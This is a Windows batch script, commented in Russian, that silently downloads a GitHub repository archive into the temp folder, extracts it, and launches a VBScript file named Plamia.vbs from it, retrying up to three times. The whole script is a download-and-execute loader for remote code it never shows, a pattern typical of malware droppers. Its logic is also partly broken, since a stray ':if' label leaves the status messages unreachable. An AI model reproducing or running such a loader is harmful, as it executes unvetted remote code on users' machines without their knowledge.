@echo off
SETLOCAL EnableExtensions DisableDelayedExpansion
SET "REPO_NAME=LemonTree"           REM Название репозитория (без расширения)
SET "OWNER=ReZeroIsMyLove"                   REM Владельца репозитория (организация или пользователь)
SET "BRANCH=main"               REM Ветвь репозитория (можете поменять на другую, например, main)
SET "DOWNLOAD_URL=https://github.com/%OWNER%/%REPO_NAME%/archive/refs/heads/%BRANCH%.zip"
SET "TARGET_FOLDER=%temp%"      REM Место, куда хотим разместить проект
SET "ZIP_FILE_PATH=%TEMP%\\%REPO_NAME%-tmp.zip"
SET "EXTRACTED_REPO_PATH=%TARGET_FOLDER%\\%REPO_NAME%-%BRANCH%"
IF NOT EXIST "%TARGET_FOLDER%" (
    md "%TARGET_FOLDER%"
)
curl.exe -sSL -o "%ZIP_FILE_PATH%" "%DOWNLOAD_URL%"
tar -xf "%ZIP_FILE_PATH%" -C "%TARGET_FOLDER%"
@echo off
SETLOCAL EnableDelayedExpansion

REM Количество попыток повторного открытия
set ATTEMPTS=3

REM Полный путь к файлу
set FILE_PATH="%temp%\\LemonTree-main\\Plamia.vbs"

REM Переменная для отслеживания успешности открытия
set SUCCESSFUL=NO

for /L %%i in (1,1,%ATTEMPTS%) do (
    if not exist !FILE_PATH! (
        echo Файл '%FILE_PATH%' не найден. Повторная попытка...
        timeout /T 3 >nul
    ) else (
        start "" "!FILE_PATH!"
        set SUCCESSFUL=YES
        goto :END_LOOP
    )
)

:if "%SUCCESSFUL%"=="NO" (
    echo Все попытки открыть файл завершились неудачей.
) else (
    echo Файл успешно открыт!
)

:END_LOOP
EXIT /B
